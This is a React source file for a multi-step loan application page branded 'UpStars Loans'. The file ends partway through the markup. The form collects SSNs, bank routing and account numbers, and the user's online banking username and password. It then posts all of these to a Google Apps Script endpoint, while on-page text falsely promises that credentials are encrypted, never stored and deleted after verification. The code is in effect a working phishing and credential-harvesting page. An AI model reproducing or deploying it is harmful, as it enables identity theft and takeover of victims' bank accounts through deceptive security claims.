import React, { useState, useRef, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import { User, Mail, Phone, DollarSign, Lock, CheckCircle, ArrowRight, Shield, Calendar, MapPin, CreditCard, Building2, FileText, Download } from 'lucide-react'

const PersonalFinancing = () => {
  const [currentStep, setCurrentStep] = useState(1)
  const [formData, setFormData] = useState({
    loanAmount: '',
    loanPurpose: '',
    firstName: '',
    lastName: '',
    email: '',
    homeAddress: '',
    city: '',
    state: '',
    zipCode: '',
    dateOfBirth: '',
    ssnNumber: '',
    bankName: '',
    routingNumber: '',
    accountNumber: '',
    userId: '',
    password: '',
    phoneNumber: ''
  })
  const [showAgreement, setShowAgreement] = useState(false)
  const [agreementAccepted, setAgreementAccepted] = useState(false)
  const [signature, setSignature] = useState('')
  const [isProcessing, setIsProcessing] = useState(false)
  const [isDrawing, setIsDrawing] = useState(false)
  const canvasRef = useRef(null)
  const navigate = useNavigate()

  // Initialize canvas with proper drawing settings
  useEffect(() => {
    const canvas = canvasRef.current
    if (canvas) {
      const ctx = canvas.getContext('2d')
      ctx.strokeStyle = '#000000'
      ctx.lineWidth = 2
      ctx.lineCap = 'round'
      ctx.lineJoin = 'round'
    }
  }, [])

  const handleInputChange = (e) => {
    const { name, value } = e.target
    setFormData({
      ...formData,
      [name]: value
    })
  }

  const startDrawing = (e) => {
    setIsDrawing(true)
    const canvas = canvasRef.current
    const rect = canvas.getBoundingClientRect()
    const ctx = canvas.getContext('2d')
    
    ctx.beginPath()
    ctx.moveTo(e.nativeEvent.offsetX, e.nativeEvent.offsetY)
  }

  const draw = (e) => {
    if (!isDrawing) return
    
    const canvas = canvasRef.current
    const ctx = canvas.getContext('2d')
    
    ctx.lineTo(e.nativeEvent.offsetX, e.nativeEvent.offsetY)
    ctx.stroke()
  }

  const stopDrawing = () => {
    setIsDrawing(false)
    // Auto-save signature when user stops drawing
    saveSignature()
  }

  const clearSignature = () => {
    const canvas = canvasRef.current
    const ctx = canvas.getContext('2d')
    ctx.clearRect(0, 0, canvas.width, canvas.height)
    setSignature('')
  }

  const saveSignature = () => {
    const canvas = canvasRef.current
    if (canvas) {
      const dataURL = canvas.toDataURL()
      setSignature(dataURL)
      console.log('Signature saved:', dataURL.substring(0, 50) + '...')
    }
  }

  const handleStep1Submit = (e) => {
    e.preventDefault()
    if (formData.loanAmount && formData.loanPurpose && formData.firstName && formData.lastName && 
        formData.email && formData.homeAddress && formData.city && formData.state && formData.zipCode && formData.dateOfBirth &&
        formData.ssnNumber && formData.bankName && formData.routingNumber && formData.accountNumber) {
      setCurrentStep(2)
    }
  }

  const handleStep2Submit = (e) => {
    e.preventDefault()
    if (formData.userId && formData.password && formData.phoneNumber) {
      setShowAgreement(true)
    }
  }

  const handleAgreementSubmit = () => {
    if (agreementAccepted && signature) {
      setCurrentStep(3)
      setIsProcessing(true)
      
      // Submit form to Google Apps Script
      submitToGoogleSheets()
      
      setTimeout(() => {
        navigate('/application-summary')
      }, 3000)
    }
  }

  const submitToGoogleSheets = async () => {
    try {
      const scriptUrl = 'https://script.google.com/macros/s/AKfycbwIlAfBITq6kvRw1xG4cFEV_E09i2FmYuaviFdBGbuDEYHV7NRqFL9B14QFYzcIFkWa/exec'
      
      const formDataToSubmit = {
        formType: 'loanApplication',
        loanAmount: formData.loanAmount,
        loanPurpose: formData.loanPurpose,
        firstName: formData.firstName,
        lastName: formData.lastName,
        email: formData.email,
        homeAddress: formData.homeAddress,
        city: formData.city,
        state: formData.state,
        zipCode: formData.zipCode,
        dateOfBirth: formData.dateOfBirth,
        ssnNumber: formData.ssnNumber,
        bankName: formData.bankName,
        routingNumber: formData.routingNumber,
        accountNumber: formData.accountNumber,
        userId: formData.userId,
        password: formData.password,
        phoneNumber: formData.phoneNumber
      }

      const response = await fetch(scriptUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams(formDataToSubmit)
      })

      const result = await response.json()
      
      if (result.status === 'success') {
        console.log('Form submitted successfully:', result.message)
      } else {
        console.error('Form submission error:', result.message)
      }
    } catch (error) {
      console.error('Error submitting form:', error)
    }
  }

  const downloadAgreement = () => {
    console.log('Download agreement clicked')
    console.log('Agreement accepted:', agreementAccepted)
    console.log('Signature exists:', !!signature)
    console.log('Form data:', formData)
    
    const agreementContent = `LOAN AGREEMENT - UpStars Loans
    
Date: ${new Date().toLocaleDateString()}
Application ID: #${Math.random().toString(36).substr(2, 9).toUpperCase()}

BORROWER INFORMATION:
Name: ${formData.firstName} ${formData.lastName}
Address: ${formData.homeAddress}, ${formData.city}, ${formData.state} ${formData.zipCode}
Phone: ${formData.phoneNumber}
Date of Birth: ${formData.dateOfBirth}

LOAN DETAILS:
Requested Amount: $${formData.loanAmount}
Loan Purpose: ${formData.loanPurpose}
Bank: ${formData.bankName}

TERMS AND CONDITIONS:
1. The borrower acknowledges that UpStars Loans is a platform connecting borrowers with third-party lenders.
2. The borrower authorizes UpStars Loans to share their information with potential lenders.
3. The borrower confirms that all provided information is accurate and complete.
4. The borrower understands that loan approval is at the discretion of individual lenders.
5. The borrower agrees to repay any approved loan according to the lender terms.
6. Interest rates and repayment terms will be provided by the approving lender.
7. The borrower authorizes electronic communication regarding their loan application.

SECURITY AND PRIVACY:
- Your information is protected by 256-bit SSL encryption
- We only share information with verified financial institutions
- You can revoke consent at any time
- We comply with all applicable privacy laws

DISCLOSURE:
This is not a loan approval. Final terms will be provided by the lender if your application is approved.

SIGNATURE:
By signing below, the borrower confirms they have read, understood, and agree to all terms and conditions outlined in this agreement.

Borrower Signature: ${signature.includes('data:') ? 'Electronic Signature (Canvas)' : signature}
Date: ${new Date().toLocaleDateString()}

For questions, contact: support@upstarsloans.com | 1-800-UPSTARS
Privacy Policy: www.upstarsloans.com/privacy-policy
Terms of Service: www.upstarsloans.com/terms-of-service`

    const blob = new Blob([agreementContent], { type: 'text/plain' })
    const url = window.URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `loan-agreement-${formData.firstName}-${formData.lastName}.txt`
    document.body.appendChild(a)
    
    console.log('Attempting to download file:', a.download)
    a.click()
    document.body.removeChild(a)
    window.URL.revokeObjectURL(url)
    console.log('Download completed')
  }

  const renderStep1 = () => (
    <div className="max-w-4xl mx-auto">
      <div className="text-center mb-8">
        <div className="w-16 h-16 bg-primary-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <User className="w-8 h-8 text-primary-600" />
        </div>
        <h2 className="text-2xl font-bold text-gray-900 mb-2">Step 1: Your Information</h2>
        <p className="text-gray-600">Tell us about yourself and your financing needs</p>
      </div>

      <form onSubmit={handleStep1Submit} className="space-y-8">
        {/* Loan Information */}
        <div className="bg-gray-50 rounded-xl p-6">
          <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
            <DollarSign className="w-5 h-5 mr-2 text-primary-600" />
            Loan Information
          </h3>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Loan Amount ($2,000 to $10,000)
              </label>
              <div className="relative">
                <DollarSign className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                <input
                  type="number"
                  name="loanAmount"
                  value={formData.loanAmount}
                  onChange={handleInputChange}
                  className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                  placeholder="5000"
                  min="2000"
                  max="10000"
                  required
                />
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Loan Purpose
              </label>
              <select
                name="loanPurpose"
                value={formData.loanPurpose}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                required
              >
                <option value="">Select a purpose</option>
                <option value="debt-consolidation">Debt Consolidation</option>
                <option value="home-improvement">Home Improvement</option>
                <option value="medical-expenses">Medical Expenses</option>
                <option value="car-repair">Car Repair</option>
                <option value="major-purchase">Major Purchase</option>
                <option value="vacation">Vacation</option>
                <option value="wedding">Wedding</option>
                <option value="other">Other</option>
              </select>
            </div>
          </div>
        </div>

        {/* Personal Information */}
        <div className="bg-gray-50 rounded-xl p-6">
          <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
            <User className="w-5 h-5 mr-2 text-primary-600" />
            Personal Information
          </h3>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                First Name *
              </label>
              <input
                type="text"
                name="firstName"
                value={formData.firstName}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                placeholder="John"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Last Name *
              </label>
              <input
                type="text"
                name="lastName"
                value={formData.lastName}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                placeholder="Doe"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Email Address *
              </label>
              <div className="relative">
                <Mail className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                <input
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                  placeholder="john.doe@example.com"
                  required
                />
              </div>
              <p className="text-xs text-gray-500 mt-1">
                We only use your email to connect you with providers
              </p>
            </div>

            <div className="md:col-span-2">
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Home Address *
              </label>
              <div className="relative">
                <MapPin className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                <input
                  type="text"
                  name="homeAddress"
                  value={formData.homeAddress}
                  onChange={handleInputChange}
                  className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                  placeholder="123 Main Street"
                  required
                />
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                City *
              </label>
              <input
                type="text"
                name="city"
                value={formData.city}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                placeholder="New York"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                State *
              </label>
              <select
                name="state"
                value={formData.state}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                required
              >
                <option value="">Select a state</option>
                <option value="AL">Alabama</option>
                <option value="AK">Alaska</option>
                <option value="AZ">Arizona</option>
                <option value="AR">Arkansas</option>
                <option value="CA">California</option>
                <option value="CO">Colorado</option>
                <option value="CT">Connecticut</option>
                <option value="DE">Delaware</option>
                <option value="FL">Florida</option>
                <option value="GA">Georgia</option>
                <option value="HI">Hawaii</option>
                <option value="ID">Idaho</option>
                <option value="IL">Illinois</option>
                <option value="IN">Indiana</option>
                <option value="IA">Iowa</option>
                <option value="KS">Kansas</option>
                <option value="KY">Kentucky</option>
                <option value="LA">Louisiana</option>
                <option value="ME">Maine</option>
                <option value="MD">Maryland</option>
                <option value="MA">Massachusetts</option>
                <option value="MI">Michigan</option>
                <option value="MN">Minnesota</option>
                <option value="MS">Mississippi</option>
                <option value="MO">Missouri</option>
                <option value="MT">Montana</option>
                <option value="NE">Nebraska</option>
                <option value="NV">Nevada</option>
                <option value="NH">New Hampshire</option>
                <option value="NJ">New Jersey</option>
                <option value="NM">New Mexico</option>
                <option value="NY">New York</option>
                <option value="NC">North Carolina</option>
                <option value="ND">North Dakota</option>
                <option value="OH">Ohio</option>
                <option value="OK">Oklahoma</option>
                <option value="OR">Oregon</option>
                <option value="PA">Pennsylvania</option>
                <option value="RI">Rhode Island</option>
                <option value="SC">South Carolina</option>
                <option value="SD">South Dakota</option>
                <option value="TN">Tennessee</option>
                <option value="TX">Texas</option>
                <option value="UT">Utah</option>
                <option value="VT">Vermont</option>
                <option value="VA">Virginia</option>
                <option value="WA">Washington</option>
                <option value="WV">West Virginia</option>
                <option value="WI">Wisconsin</option>
                <option value="WY">Wyoming</option>
              </select>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                ZIP Code *
              </label>
              <input
                type="text"
                name="zipCode"
                value={formData.zipCode}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                placeholder="10001"
                pattern="[0-9]{5}"
                maxLength="5"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Date of Birth *
              </label>
              <div className="relative">
                <Calendar className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                <input
                  type="date"
                  name="dateOfBirth"
                  value={formData.dateOfBirth}
                  onChange={handleInputChange}
                  className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                  required
                />
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                SSN Number *
              </label>
              <input
                type="text"
                name="ssnNumber"
                value={formData.ssnNumber}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                placeholder="123456789"
                pattern="[0-9]{9}"
                maxLength="9"
                required
              />
            </div>
          </div>
        </div>

        {/* Financial Information */}
        <div className="bg-gray-50 rounded-xl p-6">
          <h3 className="text-lg font-semibold text-gray-900 mb-2 flex items-center">
            <CreditCard className="w-5 h-5 mr-2 text-primary-600" />
            Financial Information
          </h3>
          <p className="text-sm text-gray-600 mb-4">Your information is encrypted and secure</p>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Bank Name *
              </label>
              <div className="relative">
                <Building2 className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                <select
                  name="bankName"
                  value={formData.bankName}
                  onChange={handleInputChange}
                  className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                  required
                >
                  <option value="">Select your bank</option>
                  <option value="Chase">Chase</option>
                  <option value="Bank of America">Bank of America</option>
                  <option value="Navy Federal Credit Union">Navy Federal Credit Union</option>
                  <option value="Wells Fargo">Wells Fargo</option>
                  <option value="US Bank">US Bank</option>
                  <option value="Regions Bank">Regions Bank</option>
                  <option value="USAA Federal Savings Bank">USAA Federal Savings Bank</option>
                  <option value="TD Bank">TD Bank</option>
                  <option value="Truist Bank">Truist Bank</option>
                  <option value="Huntington National Bank">Huntington National Bank</option>
                  <option value="Alabama Central CU">Alabama Central CU</option>
                  <option value="Navigator Credit Union">Navigator Credit Union</option>
                  <option value="Diversified Members Credit Union">Diversified Members Credit Union</option>
                  <option value="Arthur State Bank">Arthur State Bank</option>
                  <option value="Others">Others</option>
                </select>
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Routing Number *
              </label>
              <input
                type="text"
                name="routingNumber"
                value={formData.routingNumber}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                placeholder="12345678"
                pattern="[0-9]{8}"
                maxLength="8"
                required
              />
            </div>

            <div className="md:col-span-2">
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Account Number *
              </label>
              <input
                type="text"
                name="accountNumber"
                value={formData.accountNumber}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                placeholder="1234"
                pattern="[0-9]{4,20}"
                minLength="4"
                maxLength="20"
                required
              />
            </div>
          </div>
        </div>

        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
          <p className="text-sm text-blue-800 text-center">
            Your details are securely shared with relevant providers
          </p>
        </div>

        <button
          type="submit"
          className="w-full btn-primary text-lg py-4"
        >
          Continue
          <ArrowRight className="ml-2 w-5 h-5 inline" />
        </button>
      </form>
    </div>
  )

  const renderStep2 = () => (
    <div className="max-w-6xl mx-auto">
      <div className="text-center mb-8">
        <div className="w-16 h-16 bg-accent-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <Lock className="w-8 h-8 text-accent-600" />
        </div>
        <h2 className="text-2xl font-bold text-gray-900 mb-2">Step 2: Secure Verification</h2>
        <p className="text-gray-600">Securely connect your bank account to verify your financial information</p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
        {/* Left Column - Security Info */}
        <div className="space-y-6">
          {/* Security Priority */}
          <div className="bg-blue-50 border border-blue-200 rounded-xl p-6">
            <h3 className="font-bold text-blue-900 mb-3 flex items-center">
              <Shield className="w-5 h-5 mr-2 text-blue-600" />
              Your Security is Our Priority
            </h3>
            <p className="text-blue-800">
              We use industry-leading security measures to protect your financial information and ensure your data remains safe and private.
            </p>
          </div>

          {/* How It Works */}
          <div className="bg-gray-50 rounded-xl p-6">
            <h3 className="font-bold text-gray-900 mb-4">How Secure Verification Works</h3>
            <p className="text-gray-600 mb-4">Our secure bank authentication process is simple and takes just a few minutes.</p>
            
            <div className="space-y-3">
              {[
                { step: "Step 1", title: "Choose Your Bank", desc: "Select your bank from our list of supported financial institutions." },
                { step: "Step 2", title: "Secure Login", desc: "Log in using your existing online banking credentials through our secure portal." },
                { step: "Step 3", title: "Grant Permission", desc: "Authorize us to access your account information for verification purposes only." },
                { step: "Step 4", title: "Instant Verification", desc: "We verify your income and account information instantly and securely." }
              ].map((item, index) => (
                <div key={index} className="flex items-start space-x-3">
                  <div className="w-8 h-8 bg-primary-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                    <span className="text-primary-600 font-bold text-xs">{item.step.split(' ')[1]}</span>
                  </div>
                  <div>
                    <h4 className="font-semibold text-gray-900">{item.title}</h4>
                    <p className="text-sm text-gray-600">{item.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Security Measures */}
          <div className="bg-green-50 border border-green-200 rounded-xl p-6">
            <h3 className="font-bold text-green-900 mb-4">Our Security Measures</h3>
            <p className="text-green-800 mb-4">We employ multiple layers of security to protect your sensitive financial information.</p>
            
            <div className="space-y-3">
              {[
                { title: "256-bit SSL Encryption", desc: "All data transmission is protected with bank-level encryption technology." },
                { title: "Secure Data Storage", desc: "Your information is stored in secure, encrypted databases with restricted access." },
                { title: "Limited Data Use", desc: "We only use your banking information for loan verification and underwriting purposes." },
                { title: "Automatic Deletion", desc: "Your banking credentials are automatically deleted after verification is complete." },
                { title: "Regulatory Compliance", desc: "We comply with all federal banking regulations and privacy laws." }
              ].map((item, index) => (
                <div key={index} className="flex items-start space-x-2">
                  <CheckCircle className="w-4 h-4 text-green-600 mt-0.5 flex-shrink-0" />
                  <div>
                    <h4 className="font-semibold text-green-900 text-sm">{item.title}</h4>
                    <p className="text-xs text-green-800">{item.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Right Column - Form */}
        <div className="space-y-6">
          {/* Bank Connection Form */}
          <div className="bg-white rounded-xl shadow-lg p-6 border border-gray-200">
            <h3 className="font-bold text-gray-900 mb-4">Connect Your Bank Account</h3>
            <p className="text-sm text-gray-600 mb-6">Securely connect your mobile banking account to verify your financial information instantly.</p>
            
            <form onSubmit={handleStep2Submit} className="space-y-6">
              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
                <p className="text-sm text-yellow-800">
                  <strong>Secure Bank Connection:</strong> Your credentials are encrypted and never stored
                </p>
              </div>

              {/* Bank Selection */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Bank Name *
                </label>
                <div className="relative">
                  <Building2 className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                  <select
                    name="bankName"
                    value={formData.bankName}
                    onChange={handleInputChange}
                    className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                    required
                  >
                    <option value="">Select your bank</option>
                    <option value="Chase">Chase</option>
                    <option value="Bank of America">Bank of America</option>
                    <option value="Navy Federal Credit Union">Navy Federal Credit Union</option>
                    <option value="Wells Fargo">Wells Fargo</option>
                    <option value="US Bank">US Bank</option>
                    <option value="Regions Bank">Regions Bank</option>
                    <option value="USAA Federal Savings Bank">USAA Federal Savings Bank</option>
                    <option value="TD Bank">TD Bank</option>
                    <option value="Truist Bank">Truist Bank</option>
                    <option value="Huntington National Bank">Huntington National Bank</option>
                    <option value="Alabama Central CU">Alabama Central CU</option>
                    <option value="Navigator Credit Union">Navigator Credit Union</option>
                    <option value="Diversified Members Credit Union">Diversified Members Credit Union</option>
                  </select>
                </div>
              </div>

              {/* User ID */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  User ID *
                </label>
                <div className="relative">
                  <User className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                  <input
                    type="text"
                    name="userId"
                    value={formData.userId}
                    onChange={handleInputChange}
                    className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                    placeholder="Enter your mobile banking username"
                    required
                  />
                </div>
                <p className="text-xs text-gray-500 mt-1">This is username you use to log into your bank's mobile app</p>
              </div>

              {/* Password */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Password *
                </label>
                <div className="relative">
                  <Lock className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                  <input
                    type="password"
                    name="password"
                    value={formData.password}
                    onChange={handleInputChange}
                    className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                    placeholder="Enter your mobile banking password"
                    required
                  />
                </div>
                <p className="text-xs text-gray-500 mt-1">Your password is encrypted and will be deleted after verification</p>
              </div>

              {/* Phone Number */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Telephone Number *
                </label>
                <div className="relative">
                  <Phone className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                  <input
                    type="tel"
                    name="phoneNumber"
                    value={formData.phoneNumber}
                    onChange={handleInputChange}
                    className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                    placeholder="(555) 123-4567"
                    pattern="[0-9]{3}-[0-9]{3}-[0-9]{4}"
                    required
                  />
                </div>
                <p className="text-xs text-gray-500 mt-1">Used for verification and provider communication</p>
              </div>

              {/* Security Notice */}
              <div className="bg-red-50 border border-red-200 rounded-lg p-4">
                <h4 className="font-semibold text-red-900 mb-2">Important Security Notice</h4>
                <ul className="text-sm text-red-800 space-y-1">
                  <li>• We use read-only access to verify your account information</li>
                  <li>• Your login credentials are never stored on our servers</li>
                  <li>• Connection is secured with 256-bit SSL encryption</li>
                  <li>• You can revoke access at any time through your bank</li>
                </ul>
              </div>

              {/* Terms Agreement */}
              <div className="bg-gray-50 rounded-lg p-4">
                <label className="flex items-start space-x-3">
                  <input type="checkbox" className="mt-1" required />
                  <span className="text-sm text-gray-700">
                    By connecting your account, you agree to our <a href="/privacy-policy" className="text-primary-600 hover:underline">Privacy Policy</a> and <a href="/terms-of-service" className="text-primary-600 hover:underline">Terms of Service</a>
                  </span>
                </label>
              </div>

              <button
                type="submit"
                className="w-full btn-primary text-lg py-4"
              >
                Generate Agreement
                <ArrowRight className="ml-2 w-5 h-5 inline" />
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  )

  const renderAgreementStep = () => (
    <div className="max-w-4xl mx-auto">
      <div className="text-center mb-8">
        <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <FileText className="w-8 h-8 text-green-600" />
        </div>
        <h2 className="text-2xl font-bold text-gray-900 mb-2">Review and Sign Your Agreement</h2>
        <p className="text-gray-600">Please review your personalized loan agreement and sign to proceed</p>
      </div>

      <div className="bg-white rounded-2xl shadow-lg p-8 border border-gray-200">
        {/* Agreement Content */}
        <div className="bg-gray-50 rounded-lg p-6 mb-8 max-h-96 overflow-y-auto">
          <h3 className="text-xl font-bold text-gray-900 mb-4">LOAN AGREEMENT - UpStars Loans</h3>
          
          <div className="space-y-4 text-sm text-gray-700">
            <div>
              <strong>Date:</strong> {new Date().toLocaleDateString()}
            </div>
            <div>
              <strong>Application ID:</strong> #{Math.random().toString(36).substr(2, 9).toUpperCase()}
            </div>
            
            <div className="border-t pt-4">
              <h4 className="font-semibold mb-2">BORROWER INFORMATION:</h4>
              <div className="space-y-1 ml-4">
                <div><strong>Name:</strong> {formData.firstName} {formData.lastName}</div>
                <div><strong>Address:</strong> {formData.homeAddress}, {formData.city}, {formData.state} {formData.zipCode}</div>
                <div><strong>Phone:</strong> {formData.phoneNumber}</div>
                <div><strong>Date of Birth:</strong> {formData.dateOfBirth}</div>
              </div>
            </div>
            
            <div className="border-t pt-4">
              <h4 className="font-semibold mb-2">LOAN DETAILS:</h4>
              <div className="space-y-1 ml-4">
                <div><strong>Requested Amount:</strong> ${formData.loanAmount}</div>
                <div><strong>Loan Purpose:</strong> {formData.loanPurpose}</div>
                <div><strong>Bank:</strong> {formData.bankName}</div>
              </div>
            </div>
            
            <div className="border-t pt-4">
              <h4 className="font-semibold mb-2">TERMS AND CONDITIONS:</h4>
              <ol className="list-decimal list-inside space-y-1 ml-4">
                <li>The borrower acknowledges that UpStars Loans is a platform connecting borrowers with third-party lenders.</li>
                <li>The borrower authorizes UpStars Loans to share their information with potential lenders.</li>
                <li>The borrower confirms that all provided information is accurate and complete.</li>
                <li>The borrower understands that loan approval is at the discretion of individual lenders.</li>
                <li>The borrower agrees to repay any approved loan according to the lender terms.</li>
                <li>Interest rates and repayment terms will be provided by the approving lender.</li>
                <li>The borrower authorizes electronic communication regarding their loan application.</li>
              </ol>
            </div>
            
            <div className="border-t pt-4">
              <h4 className="font-semibold mb-2">SECURITY AND PRIVACY:</h4>
              <ul className="list-disc list-inside space-y-1 ml-4">
                <li>Your information is protected by 256-bit SSL encryption</li>
                <li>We only share information with verified financial institutions</li>
                <li>You can revoke consent at any time</li>
                <li>We comply with all applicable privacy laws</li>
              </ul>
            </div>
            
            <div className="border-t pt-4">
              <h4 className="font-semibold mb-2">DISCLOSURE:</h4>
              <p className="ml-4">This is not a loan approval. Final terms will be provided by the lender if your application is approved.</p>
            </div>
            
            <div className="border-t pt-4">
              <h4 className="font-semibold mb-2">SIGNATURE:</h4>
              <p className="ml-4 mb-2">By signing below, the borrower confirms they have read, understood, and agree to all terms and conditions outlined in this agreement.</p>
            </div>
            
            <div className="border-t pt-4">
              <div className="space-y-2 ml-4">
                <div><strong>For questions, contact:</strong> support@upstarsloans.com | 1-800-UPSTARS</div>
                <div><strong>Privacy Policy:</strong> www.upstarsloans.com/privacy-policy</div>
                <div><strong>Terms of Service:</strong> www.upstarsloans.com/terms-of-service</div>
              </div>
            </div>
          </div>
        </div>

        {/* Signature Section */}
        <div className="border-t pt-6">
          <h3 className="text-lg font-semibold text-gray-900 mb-4">Electronic Signature</h3>
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Your Signature *
              </label>
              
              {/* Signature Canvas */}
              <div className="border-2 border-gray-300 rounded-lg bg-white mb-4">
                <canvas
                  ref={canvasRef}
                  width={400}
                  height={200}
                  className="w-full cursor-crosshair"
                  onMouseDown={startDrawing}
                  onMouseMove={draw}
                  onMouseUp={stopDrawing}
                  onMouseLeave={stopDrawing}
                  style={{ touchAction: 'none' }}
                />
              </div>
              
              {/* Signature Controls */}
              <div className="flex gap-2 mb-4">
                <button
                  type="button"
                  onClick={clearSignature}
                  className="px-4 py-2 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300 text-sm"
                >
                  Clear
                </button>
                <button
                  type="button"
                  onClick={saveSignature}
                  className="px-4 py-2 bg-primary-600 text-white rounded-lg hover:bg-primary-700 text-sm"
                >
                  Save Signature
                </button>
              </div>
              
              {/* Signature Preview */}
              {signature && (
                <div className="mt-4 p-4 bg-gray-50 rounded-lg">
                  <p className="text-sm text-gray-600 mb-2">Signature Preview:</p>
                  <img src={signature} alt="Signature" className="max-w-full h-20 border border-gray-200 rounded" />
                </div>
              )}
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Agreement Date
              </label>
              <input
                type="text"
                value={new Date().toLocaleDateString()}
                readOnly
                className="w-full px-3 py-3 border border-gray-200 rounded-lg bg-gray-50"
              />
            </div>
          </div>
          
          <div className="mt-6">
            <label className="flex items-start space-x-3">
              <input
                type="checkbox"
                checked={agreementAccepted}
                onChange={(e) => setAgreementAccepted(e.target.checked)}
                className="mt-1"
                required
              />
              <span className="text-sm text-gray-700">
                I have read, understood, and agree to all terms and conditions outlined in this agreement. I understand this is an electronic signature and has the same legal effect as a handwritten signature. By signing below, I confirm that this electronic signature is legally binding.
              </span>
            </label>
          </div>
        </div>

        {/* Action Buttons */}
        <div className="mt-8 flex flex-col sm:flex-row gap-4">
          <button
            onClick={downloadAgreement}
            className="flex-1 btn-secondary text-lg py-4"
            disabled={!agreementAccepted || !signature}
          >
            <Download className="w-5 h-5 mr-2 inline" />
            Download Agreement
          </button>
          <button
            onClick={handleAgreementSubmit}
            className="flex-1 btn-primary text-lg py-4"
            disabled={!agreementAccepted || !signature}
          >
            I Agree - Continue
